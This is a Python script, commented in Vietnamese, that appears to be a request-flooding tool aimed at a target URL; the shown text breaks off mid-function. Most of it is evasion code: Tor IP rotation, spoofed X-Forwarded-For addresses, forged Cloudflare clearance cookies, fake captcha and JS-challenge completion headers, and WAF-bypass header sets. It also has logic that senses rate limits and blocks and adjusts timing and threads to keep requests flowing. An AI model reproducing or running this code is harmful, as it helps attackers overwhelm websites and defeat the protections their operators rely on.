import requests
import time
import signal
import sys
import os
import platform
import random
import string
import socket
import ssl
import gzip
import zlib
import re
import json
import base64
import hmac
import hashlib
import threading
import argparse
import ipaddress
import uuid
import queue
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse, urljoin
from itertools import cycle
import subprocess
import tempfile

# Kích hoạt hỗ trợ màu trên Windows
if platform.system() == 'Windows':
    os.system('color')

# Thêm màu sắc
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# Cài đặt thư viện cần thiết nếu chưa có
required_packages = ['tqdm', 'requests']
for package in required_packages:
    try:
        __import__(package.replace('-', '_'))
    except ImportError:
        print(f"Đang cài đặt {package}...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])

try:
    from tqdm import tqdm
except ImportError:
    # Nếu vẫn không thể import sau khi cài đặt
    class tqdm:
        def __init__(self, total, desc, unit, ncols, bar_format):
            self.total = total
            self.n = 0
            self.desc = desc
        def update(self, n):
            self.n += n
            print(f"{self.desc}: {self.n}/{self.total}")
        def refresh(self):
            pass
        def __enter__(self):
            return self
        def __exit__(self, exc_type, exc_val, exc_tb):
            pass

try:
    from fake_useragent import UserAgent
    ua = UserAgent()
    HAVE_FAKE_UA = True
except ImportError:
    HAVE_FAKE_UA = False

try:
    import socks
    HAVE_SOCKS = True
except ImportError:
    HAVE_SOCKS = False

try:
    from stem import Signal
    from stem.control import Controller
    HAVE_TOR = True
except ImportError:
    HAVE_TOR = False

# Cấu hình mặc định
DEFAULT_REQUESTS = 100  # Giảm số lượng requests mặc định
DEFAULT_CONCURRENCY = 10  # Giảm số thread mặc định
DEFAULT_TIMEOUT = 30  # Tăng timeout
DEFAULT_DELAY = (0.1, 0.5)  # Giảm độ trễ
DEFAULT_BATCH_SIZE = 20  # Giảm kích thước batch
DEFAULT_RETRY_ATTEMPTS = 3
MAX_QUEUE_SIZE = 1000
TOR_PORT = 9050
TOR_CONTROL_PORT = 9051
TOR_PASSWORD = ""  # Thay đổi nếu có mật khẩu
ROTATE_TOR_EVERY = 10  # Số requests trước khi đổi IP Tor

# Biến toàn cục
URL = ""
is_paused = False
is_running = True
total_success = 0
total_error = 0
total_retries = 0
start_time_global = None
CONCURRENCY = DEFAULT_CONCURRENCY
successful_techniques = {}
rate_limited = False
cloudflare_detected = False
challenge_detected = False
waf_detected = False
bot_protection_detected = False
cookies_jar = {}
discovered_paths = set()
effective_techniques = {}
target_info = {}
request_queue = queue.Queue(maxsize=MAX_QUEUE_SIZE)
response_times = []
blocked_ips = set()
successful_ips = {}  # IP -> success count
tor_enabled = False
proxy_rotation = False
request_count = 0
tor_session_count = 0
captcha_detected = False
js_challenge_detected = False
use_proxies = False
use_tor = False
proxy_list = []
browser_emulation = False

# Danh sách User-Agent cao cấp (browser hiện đại)
PREMIUM_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
]

# Danh sách các kỹ thuật
TECHNIQUES = [
    "premium_browser",
    "browser_like",
    "cloudflare_bypass",
    "waf_evasion",
    "captcha_bypass",
    "js_challenge_bypass",
    "mobile_app",
    "api_like"
]

# Danh sách các header để vượt qua Cloudflare
CLOUDFLARE_BYPASS_HEADERS = {
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-User": "?1",
    "Accept-Language": "en-US,en;q=0.9",
    "sec-ch-ua": "\"Google Chrome\";v=\"119\", \"Chromium\";v=\"119\", \"Not?A_Brand\";v=\"24\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Windows\"",
    "Pragma": "no-cache",
    "Cache-Control": "max-age=0",
    "TE": "trailers"
}

# Danh sách các header để vượt qua WAF
WAF_EVASION_HEADERS = {
    "X-Originating-IP": "127.0.0.1",
    "X-Forwarded-For": "127.0.0.1, 127.0.0.2",
    "X-Remote-IP": "127.0.0.1",
    "X-Remote-Addr": "127.0.0.1",
    "X-ProxyUser-Ip": "127.0.0.1",
    "X-Original-URL": "/",
    "Client-IP": "127.0.0.1",
    "True-Client-IP": "127.0.0.1",
    "Cluster-Client-IP": "127.0.0.1",
    "X-Forwarded-Proto": "https",
    "X-Forwarded-Host": "example.com"
}

# Các giá trị cookie cf_clearance mẫu (để vượt qua Cloudflare)
CF_CLEARANCE_SAMPLES = [
    "rSm2wmoVuLYDFuIrJUKdSEWLOxlLFHQZgk_XZAKhgfQ-1675429218-0-150",
    "eunKf0Y9hOr3XKwbPZVozBwvzHXJxzrhYKhZrQw8jcQ-1675429218-0-150",
    "sMQQtIC5X7YnFMEQcEVUa8BLPCzccBMnC1q6Vft9aDY-1675429218-0-150",
    "j5HXkTRFtJ0U6nPVBKWHk_FgpWJQkzAOBg1axLvLvwI-1675429218-0-150",
    "qs2dTlTcMgLLAWvbX_Z3qFHbcjyZyDgGX5N5IA6g1Qc-1675429218-0-150"
]

# Các giá trị __cf_bm mẫu (để vượt qua Cloudflare Bot Management)
CF_BM_SAMPLES = [
    "JhRTXsHVlCRKJxRHfcndQJKSJyVeXXwjg_QQ1K9YXx0-1675429218-0-AUx8/RKM5QCiIQJGXciTM7rsaCkdVMdlzwpGFkqQEbxDYAqVTdDm1DrT7rQYVGAQoGKYaK16LgbRLLxP5O+vmJA=",
    "LoWr3seXJxWQJxJKUXRuMJCJyVeXXwjg_QQ1K9YXx0-1675429218-0-AUx8/RKM5QCiIQJGXciTM7rsaCkdVMdlzwpGFkqQEbxDYAqVTdDm1DrT7rQYVGAQoGKYaK16LgbRLLxP5O+vmJA=",
    "AqMqWsHVlCRKJxRHfcndQJKSJyVeXXwjg_QQ1K9YXx0-1675429218-0-AUx8/RKM5QCiIQJGXciTM7rsaCkdVMdlzwpGFkqQEbxDYAqVTdDm1DrT7rQYVGAQoGKYaK16LgbRLLxP5O+vmJA=",
    "BbGkXsHVlCRKJxRHfcndQJKSJyVeXXwjg_QQ1K9YXx0-1675429218-0-AUx8/RKM5QCiIQJGXciTM7rsaCkdVMdlzwpGFkqQEbxDYAqVTdDm1DrT7rQYVGAQoGKYaK16LgbRLLxP5O+vmJA=",
    "CcTmWsHVlCRKJxRHfcndQJKSJyVeXXwjg_QQ1K9YXx0-1675429218-0-AUx8/RKM5QCiIQJGXciTM7rsaCkdVMdlzwpGFkqQEbxDYAqVTdDm1DrT7rQYVGAQoGKYaK16LgbRLLxP5O+vmJA="
]

# Danh sách các chuỗi để vượt qua bot detection
BOT_EVASION_STRINGS = [
    "document.cookie",
    "navigator.userAgent",
    "window.innerHeight",
    "window.innerWidth",
    "screen.width",
    "screen.height",
    "history.length",
    "window.screen",
    "window.history",
    "window.navigator"
]

# Danh sách các fingerprint browser thực tế
REAL_BROWSER_FINGERPRINTS = [
    {
        "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "appVersion": "5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "platform": "Win32",
        "vendor": "Google Inc.",
        "languages": ["en-US", "en"],
        "screen": {"width": 1920, "height": 1080, "colorDepth": 24},
        "timezone": -420,
        "plugins": 5,
        "cpuCores": 8
    },
    {
        "userAgent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
        "appVersion": "5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
        "platform": "MacIntel",
        "vendor": "Apple Computer, Inc.",
        "languages": ["en-US", "en"],
        "screen": {"width": 2560, "height": 1440, "colorDepth": 30},
        "timezone": -480,
        "plugins": 3,
        "cpuCores": 10
    },
    {
        "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "appVersion": "5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "platform": "Win32",
        "vendor": "",
        "languages": ["en-US", "en"],
        "screen": {"width": 1920, "height": 1080, "colorDepth": 24},
        "timezone": -300,
        "plugins": 4,
        "cpuCores": 6
    }
]

def load_proxies(file_path=None):
    """Tải danh sách proxy từ file hoặc nguồn mặc định"""
    global proxy_list
    
    if file_path and os.path.exists(file_path):
        try:
            with open(file_path, 'r') as f:
                proxy_list = [line.strip() for line in f if line.strip()]
            print(f"{Colors.GREEN}[+] Đã tải {len(proxy_list)} proxy từ {file_path}{Colors.END}")
            return proxy_list
        except Exception as e:
            print(f"{Colors.RED}[!] Lỗi khi tải proxy từ file: {str(e)}{Colors.END}")
    
    # Nếu không có file hoặc lỗi, sử dụng danh sách mặc định
    proxy_list = [
        "socks5://127.0.0.1:9050",  # Tor default
        "socks5://127.0.0.1:1080",  # Thường dùng cho SOCKS local
        "http://127.0.0.1:8080",    # Thường dùng cho HTTP local
    ]
    
    return proxy_list

def get_random_proxy():
    """Lấy proxy ngẫu nhiên từ danh sách"""
    global proxy_list
    
    if not proxy_list:
        return None
    
    return random.choice(proxy_list)

def renew_tor_ip():
    """Đổi IP của Tor"""
    global tor_session_count
    
    if not HAVE_TOR:
        return False
    
    try:
        with Controller.from_port(port=TOR_CONTROL_PORT) as controller:
            if TOR_PASSWORD:
                controller.authenticate(password=TOR_PASSWORD)
            else:
                controller.authenticate()
            controller.signal(Signal.NEWNYM)
            tor_session_count += 1
            time.sleep(1)  # Đợi để IP mới được thiết lập
            print(f"{Colors.GREEN}[+] Đã đổi IP Tor (phiên #{tor_session_count}){Colors.END}")
            return True
    except Exception as e:
        print(f"{Colors.RED}[!] Lỗi khi đổi IP Tor: {str(e)}{Colors.END}")
        return False

def get_random_ip():
    """Tạo địa chỉ IP ngẫu nhiên hợp lệ"""
    while True:
        ip = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
        # Tránh các dải IP riêng và đặc biệt
        try:
            ip_obj = ipaddress.ip_address(ip)
            if not (ip_obj.is_private or ip_obj.is_reserved or ip_obj.is_multicast or ip_obj.is_loopback):
                return ip
        except:
            continue

def get_random_string(length=10, include_special=False):
    """Tạo chuỗi ngẫu nhiên"""
    chars = string.ascii_letters + string.digits
    if include_special:
        chars += string.punctuation
    return ''.join(random.choice(chars) for _ in range(length))

def get_random_user_agent(premium=True):
    """Lấy User-Agent ngẫu nhiên"""
    if premium:
        return random.choice(PREMIUM_USER_AGENTS)
    
    if HAVE_FAKE_UA:
        try:
            return ua.random
        except:
            pass
    
    return random.choice(PREMIUM_USER_AGENTS)

def get_real_browser_fingerprint():
    """Lấy fingerprint thực tế của browser"""
    return random.choice(REAL_BROWSER_FINGERPRINTS)

def signal_handler(sig, frame):
    """Xử lý khi người dùng nhấn Ctrl+C"""
    global is_paused, is_running
    if is_paused:
        print(f"\n{Colors.RED}[!] Đang thoát chương trình...{Colors.END}")
        is_running = False
    else:
        print(f"\n{Colors.YELLOW}[!] Đã tạm dừng. Nhấn Ctrl+C lần nữa để thoát hoặc Enter để tiếp tục...{Colors.END}")
        is_paused = True

def resume_execution():
    """Tiếp tục thực thi sau khi tạm dừng"""
    global is_paused
    print(f"{Colors.GREEN}[+] Tiếp tục thực thi...{Colors.END}")
    is_paused = False

def generate_cf_clearance():
    """Tạo cookie cf_clearance ngẫu nhiên hoặc sử dụng mẫu"""
    if random.random() < 0.7:  # 70% cơ hội sử dụng mẫu
        return random.choice(CF_CLEARANCE_SAMPLES)
    else:
        # Tạo giá trị mới
        timestamp = int(time.time())
        random_part = base64.b64encode(os.urandom(32)).decode('utf-8').replace('+', '-').replace('/', '_').replace('=', '')[:40]
        return f"{random_part}-{timestamp}-0-150"

def generate_cf_bm():
    """Tạo cookie __cf_bm ngẫu nhiên hoặc sử dụng mẫu"""
    if random.random() < 0.7:  # 70% cơ hội sử dụng mẫu
        return random.choice(CF_BM_SAMPLES)
    else:
        # Tạo giá trị mới
        timestamp = int(time.time())
        random_part1 = get_random_string(32)
        random_part2 = base64.b64encode(os.urandom(64)).decode('utf-8').replace('+', '-').replace('/', '_').replace('=', '')
        return f"{random_part1}-{timestamp}-0-{random_part2}"

def get_browser_headers(technique="premium_browser", target_url=None):
    """Tạo headers giả mạo trình duyệt dựa trên kỹ thuật"""
    fingerprint = get_real_browser_fingerprint()
    user_agent = fingerprint["userAgent"]
    x_forwarded_for = get_random_ip()
    
    # Sử dụng target_url nếu được cung cấp, nếu không thì sử dụng URL toàn cục
    url_to_use = target_url if target_url else URL
    
    # Tạo các giá trị cơ bản
    basic_headers = {
        "User-Agent": user_agent,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Referer": "https://www.google.com/"
    }
    
    # Tạo Referer an toàn
    referer = "https://www.google.com/"
    if url_to_use:
        try:
            domain = url_to_use.split('//')[1].split('/')[0]
            referer = f"https://www.google.com/search?q=site:{domain}+{get_random_string(8)}"
        except:
            pass
    
    # Tùy chỉnh headers dựa trên kỹ thuật
    if technique == "premium_browser":
        # Sử dụng fingerprint thực tế
        headers = {
            **basic_headers,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Accept-Language": "en-US,en;q=0.9",
            "Referer": referer,
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "cross-site",
            "Sec-Fetch-User": "?1",
            "DNT": "1",
            "Sec-CH-UA": f"\"Google Chrome\";v=\"{random.randint(115, 120)}\", \"Chromium\";v=\"{random.randint(115, 120)}\", \"Not?A_Brand\";v=\"{random.randint(24, 99)}\"",
            "Sec-CH-UA-Mobile": "?0",
            "Sec-CH-UA-Platform": f"\"{fingerprint['platform']}\"",
            "X-Forwarded-For": x_forwarded_for
        }
    elif technique == "browser_like":
        headers = {
            **basic_headers,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": f"{random.choice(['en-US', 'en-GB', 'fr-FR', 'de-DE'])};q=0.8,en;q=0.5,en;q=0.3",
            "Referer": referer,
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "cross-site",
            "Sec-Fetch-User": "?1",
            "DNT": "1",
            "X-Forwarded-For": x_forwarded_for
        }
    elif technique == "cloudflare_bypass":
        # Kỹ thuật đặc biệt để vượt qua Cloudflare
        headers = {
            **basic_headers,
            **CLOUDFLARE_BYPASS_HEADERS,
            "X-Forwarded-For": x_forwarded_for,
            "CF-IPCountry": random.choice(["US", "CA", "GB", "DE", "FR", "AU"]),
            "CF-Connecting-IP": x_forwarded_for,
            "CF-RAY": f"{get_random_string(16, False).lower()}-{random.choice(['DFW', 'IAD', 'SJC', 'LHR', 'FRA'])}",
            "CDN-Loop": "cloudflare",
            "Alt-Used": urlparse(url_to_use).netloc if url_to_use else "example.com",
            "Priority": "u=1, i",
            "X-Requested-With": "XMLHttpRequest"
        }
    elif technique == "waf_evasion":
        # Kỹ thuật đặc biệt để vượt qua WAF
        headers = {
            **basic_headers,
            **{k: v for k, v in WAF_EVASION_HEADERS.items() if random.random() > 0.5}
        }
        
        # Thêm các header đặc biệt để vượt qua một số WAF
        if random.random() > 0.7:
            headers["X-WAF-Bypass-Token"] = get_random_string(32)
            headers["X-Original-For"] = "127.0.0.1"
    elif technique == "captcha_bypass":
        # Kỹ thuật để vượt qua captcha
        headers = {
            **basic_headers,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Accept-Language": "en-US,en;q=0.9",
            "Referer": referer,
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "cross-site",
            "Sec-Fetch-User": "?1",
            "DNT": "1",
            "Sec-CH-UA": f"\"Google Chrome\";v=\"{random.randint(115, 120)}\", \"Chromium\";v=\"{random.randint(115, 120)}\", \"Not?A_Brand\";v=\"{random.randint(24, 99)}\"",
            "Sec-CH-UA-Mobile": "?0",
            "Sec-CH-UA-Platform": f"\"{fingerprint['platform']}\"",
            "X-Forwarded-For": x_forwarded_for,
            "CF-Challenge": random.choice(["on", "true", "completed"]),
            "X-Human-Verification": "true",
            "X-Captcha-Response": get_random_string(random.randint(500, 1000), False)
        }
    elif technique == "js_challenge_bypass":
        # Kỹ thuật để vượt qua JavaScript challenge
        headers = {
            **basic_headers,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Accept-Language": "en-US,en;q=0.9",
            "Referer": url_to_use if url_to_use else "https://www.example.com/",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-User": "?1",
            "DNT": "1",
            "Sec-CH-UA": f"\"Google Chrome\";v=\"{random.randint(115, 120)}\", \"Chromium\";v=\"{random.randint(115, 120)}\", \"Not?A_Brand\";v=\"{random.randint(24, 99)}\"",
            "Sec-CH-UA-Mobile": "?0",
            "Sec-CH-UA-Platform": f"\"{fingerprint['platform']}\"",
            "X-Forwarded-For": x_forwarded_for,
            "CF-Challenge-Result": get_random_string(32, False),
            "X-JS-Challenge": "completed"
        }
    elif technique == "mobile_app":
        app_versions = ["2.0.0", "2.1.0", "2.2.0", "3.0.0", "3.1.0"]
        device_models = ["iPhone14,3", "iPhone14,5", "SM-S908U", "Pixel 7 Pro", "OnePlus 11 Pro"]
        os_versions = ["iOS 16.4.1", "iOS 16.5", "Android 13", "Android 14", "Android 13.1"]
        
        headers = {
            "User-Agent": f"Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
            "Accept": "application/json",
            "Accept-Language": random.choice(["en-US", "en-GB", "fr-FR", "de-DE", "ja-JP"]),
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "X-App-Version": random.choice(app_versions),
            "X-Device-Model": random.choice(device_models),
            "X-OS-Version": random.choice(os_versions),
            "X-Device-ID": str(uuid.uuid4()),
            "X-Install-ID": str(uuid.uuid4()),
            "X-Forwarded-For": x_forwarded_for,
            "X-Requested-With": "XMLHttpRequest",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty"
        }
    elif technique == "api_like":
        timestamp = str(int(time.time()))
        nonce = get_random_string(16)
        api_key = get_random_string(32)
        
        headers = {
            "User-Agent": f"ApiClient/{random.randint(1, 5)}.{random.randint(0, 9)}.{random.randint(0, 9)}",
            "Accept": "application/json",
            "Content-Type": "application/json",
            "X-Api-Key": api_key,
            "X-Timestamp": timestamp,
            "X-Nonce": nonce,
            "X-Request-ID": str(uuid.uuid4()),
            "X-Signature": hmac.new(
                api_key.encode(),
                (timestamp + nonce).encode(),
                hashlib.sha256
            ).hexdigest(),
            "X-Forwarded-For": x_forwarded_for,
            "Connection": "close"
        }
    else:
        headers = {
            **basic_headers,
            "Accept": "*/*",
            "X-Forwarded-For": x_forwarded_for
        }
    
    # Thêm các header ngẫu nhiên để tránh bị phát hiện
    if random.random() < 0.3:  # 30% cơ hội thêm header ngẫu nhiên
        extra_headers = {
            "X-Client-Data": base64.b64encode(get_random_string(20).encode()).decode(),
            "X-Request-ID": str(uuid.uuid4()),
            "X-Correlation-ID": str(uuid.uuid4()),
            "X-Amzn-Trace-Id": f"Root=1-{get_random_string(8, False)}-{get_random_string(24, False)}",
            "X-B3-TraceId": get_random_string(16, False),
            "X-B3-SpanId": get_random_string(16, False),
            "X-B3-ParentSpanId": get_random_string(16, False),
            "X-Cache": random.choice(["HIT", "MISS"]),
            "Pragma": "no-cache"
        }
        # Thêm 1-3 header ngẫu nhiên
        for _ in range(random.randint(1, 3)):
            key = random.choice(list(extra_headers.keys()))
            headers[key] = extra_headers[key]
    
    return headers

def get_cookies(response=None, target_url=None):
    """Tạo cookies giả hoặc trích xuất từ response"""
    global cookies_jar
    
    # Tạo cookies cơ bản
    cookies = {
        f"cookie_{get_random_string(5)}": get_random_string(10),
        "session_id": get_random_string(32),
        "_ga": f"GA1.2.{random.randint(1000000, 9999999)}.{int(time.time() - random.randint(1000000, 9999999))}",
        "_gid": f"GA1.2.{random.randint(1000000, 9999999)}.{int(time.time())}",
        "_gat": "1",
        "_fbp": f"fb.1.{int(time.time() - random.randint(1000000, 9999999))}.{random.randint(1000000, 9999999)}",
        "euconsent-v2": get_random_string(random.randint(200, 300), False),
        "_hjFirstSeen": "1",
        "_hjid": get_random_string(36),
        "_hjSessionUser_" + get_random_string(6, False): get_random_string(36)
    }
    
    # Thêm cookies từ response nếu có
    if response and 'Set-Cookie' in response.headers:
        cookies_from_response = response.cookies.get_dict()
        cookies.update(cookies_from_response)
        
        # Lưu vào cookie jar toàn cục
        domain = urlparse(target_url).netloc if target_url else ""
        if domain:
            if domain not in cookies_jar:
                cookies_jar[domain] = {}
            cookies_jar[domain].update(cookies_from_response)
    
    # Thêm cookies từ cookie jar toàn cục nếu có
    if target_url:
        domain = urlparse(target_url).netloc
        if domain in cookies_jar:
            cookies.update(cookies_jar[domain])
    
    # Thêm cookie cf_clearance nếu đã phát hiện Cloudflare
    if cloudflare_detected and "cf_clearance" not in cookies:
        cookies["cf_clearance"] = generate_cf_clearance()
    
    # Thêm cookie __cf_bm nếu đã phát hiện Cloudflare Bot Management
    if cloudflare_detected and "__cf_bm" not in cookies:
        cookies["__cf_bm"] = generate_cf_bm()
    
    return cookies

def check_cloudflare(response):
    """Kiểm tra xem có đang bị Cloudflare chặn không"""
    global cloudflare_detected, challenge_detected, captcha_detected, js_challenge_detected
    
    if response is None:
        return False
    
    headers = response.headers
    content = response.text.lower() if hasattr(response, 'text') else ""
    
    # Kiểm tra headers
    cf_headers = [h for h in headers if h.lower().startswith(('cf-', 'server'))]
    is_cloudflare = any('cloudflare' in headers.get(h, '').lower() for h in cf_headers)
    
    # Kiểm tra challenge
    has_challenge = ('challenge' in content or 'jschl' in content or 
                    'cf-please-wait' in content)
    
    # Kiểm tra captcha
    has_captcha = 'captcha' in content
    
    # Kiểm tra JS challenge
    has_js_challenge = 'challenge' in content and 'javascript' in content
    
    if has_captcha and not captcha_detected:
        captcha_detected = True
        print(f"{Colors.RED}[!] Phát hiện Cloudflare Captcha{Colors.END}")
    
    if has_js_challenge and not js_challenge_detected:
        js_challenge_detected = True
        print(f"{Colors.RED}[!] Phát hiện Cloudflare JavaScript Challenge{Colors.END}")
    
    if has_challenge and not challenge_detected:
        challenge_detected = True
        print(f"{Colors.RED}[!] Phát hiện Cloudflare Challenge{Colors.END}")
    
    if is_cloudflare and not cloudflare_detected:
        cloudflare_detected = True
        print(f"{Colors.RED}[!] Phát hiện trang web sử dụng Cloudflare{Colors.END}")
    
    return is_cloudflare or has_challenge or has_captcha or has_js_challenge

def check_rate_limit(response):
    """Kiểm tra xem có bị giới hạn tốc độ không"""
    global rate_limited
    
    if response is None:
        return False
    
    status_code = response.status_code
    is_limited = status_code in [429, 503, 403]
    
    # Kiểm tra headers
    headers = response.headers
    has_rate_limit_headers = any(h.lower() in headers for h in [
        'retry-after', 'x-ratelimit-remaining', 'x-ratelimit-reset', 'x-rate-limit-limit'
    ])
    
    # Kiểm tra nội dung
    content = response.text.lower() if hasattr(response, 'text') else ""
    has_rate_limit_content = any(term in content for term in [
        'rate limit', 'too many requests', 'throttled', 'slow down', 'try again later'
    ])
    
    if (is_limited or has_rate_limit_headers or has_rate_limit_content) and not rate_limited:
        rate_limited = True
        print(f"{Colors.RED}[!] Phát hiện giới hạn tốc độ (Rate limiting): HTTP {status_code}{Colors.END}")
        
        if has_rate_limit_headers:
            for h in ['retry-after', 'x-ratelimit-remaining', 'x-ratelimit-reset', 'x-rate-limit-limit']:
                if h.lower() in headers:
                    print(f"    - {h}: {headers[h.lower()]}")
    
    return is_limited or has_rate_limit_headers or has_rate_limit_content

def check_waf(response):
    """Kiểm tra xem có Web Application Firewall (WAF) không"""
    global waf_detected, blocked_ips
    
    if response is None:
        return False
    
    # Kiểm tra headers
    headers = response.headers
    has_waf_headers = any(h.lower() in ['x-firewall-block', 'x-fw-block', 'x-waf-block', 'x-security'] for h in headers)
    
    # Kiểm tra nội dung
    content = response.text.lower() if hasattr(response, 'text') else ""
    has_waf_content = any(keyword in content for keyword in [
        'waf', 'firewall', 'security', 'block', 'protection', 'cloudflare', 'akamai', 'imperva', 
        'incapsula', 'distil', 'perimeterx', 'datadome', 'kasada', 'f5', 'barracuda', 'wordfence', 
        'sucuri', 'fortinet', 'forcepoint', 'forbidden', 'denied', 'captcha', 'challenge', 
        'unusual traffic', 'automated', 'bot', 'suspicious'
    ])
    
    # Kiểm tra mã trạng thái
    status_code = response.status_code
    has_waf_status = status_code in [403, 406, 418, 456, 503]
    
    is_waf = has_waf_headers or has_waf_content or has_waf_status
    
    if is_waf and not waf_detected:
        waf_detected = True
        print(f"{Colors.RED}[!] Phát hiện Web Application Firewall (WAF){Colors.END}")
        
        # Lưu IP bị chặn nếu có
        if 'X-Forwarded-For' in headers:
            blocked_ips.add(headers['X-Forwarded-For'])
    
    return is_waf

def adaptive_delay():
    """Tạo độ trễ thích ứng dựa trên tình trạng"""
    if rate_limited:
        # Nếu bị giới hạn tốc độ, tăng thời gian chờ
        return random.uniform(3.0, 5.0)
    elif captcha_detected or js_challenge_detected:
        # Nếu có captcha hoặc JS challenge, đợi lâu hơn
        return random.uniform(2.0, 4.0)
    elif cloudflare_detected or challenge_detected:
        # Nếu có Cloudflare hoặc challenge, đợi trung bình
        return random.uniform(1.0, 3.0)
    elif waf_detected:
        # Nếu có WAF, đợi ngắn
        return random.uniform(0.5, 2.0)
    else:
        # Nếu không có biện pháp bảo vệ, đợi rất ngắn
        return random.uniform(DEFAULT_DELAY[0], DEFAULT_DELAY[1])

def adjust_concurrency():
    """Điều chỉnh số lượng thread dựa trên tình trạng"""
    global CONCURRENCY
    
    if captcha_detected or js_challenge_detected:
        # Giảm mạnh nếu có captcha hoặc JS challenge
        CONCURRENCY = max(3, CONCURRENCY // 5)
    elif challenge_detected:
        # Giảm mạnh nếu có challenge
        CONCURRENCY = max(5, CONCURRENCY // 4)
    elif cloudflare_detected:
        # Giảm vừa phải nếu có Cloudflare
        CONCURRENCY = max(8, CONCURRENCY // 3)
    elif rate_limited:
        # Giảm nhẹ nếu bị giới hạn tốc độ
        CONCURRENCY = max(5, CONCURRENCY // 4)
    elif waf_detected:
        # Giảm nhẹ nếu có WAF
        CONCURRENCY = max(10, CONCURRENCY // 2)
    elif len(successful_techniques) > 0:
        # Tăng nhẹ nếu có kỹ thuật thành công
        CONCURRENCY = min(CONCURRENCY + 5, 50)
    
    return CONCURRENCY

def select_best_technique():
    """Chọn kỹ thuật tốt nhất dựa trên dữ liệu hiệu suất"""
    if not effective_techniques:
        return random.choice(TECHNIQUES)
    
    # Tính toán tỷ lệ thành công cho mỗi kỹ thuật
    success_rates = {}
    for tech, stats in effective_techniques.items():
        total = sum(stats.values())
        if total > 0:
            # Ưu tiên các response 2xx
            success_rates[tech] = (stats.get(2, 0) * 2 + stats.get(3, 0)) / total
    
    if not success_rates:
        return random.choice(TECHNIQUES)
    
    # Chọn kỹ thuật tốt nhất với xác suất cao hơn
    if random.random() < 0.9:  # 90% thời gian chọn kỹ thuật tốt
        best_techniques = sorted(success_rates.items(), key=lambda x: x[1], reverse=True)[:3]
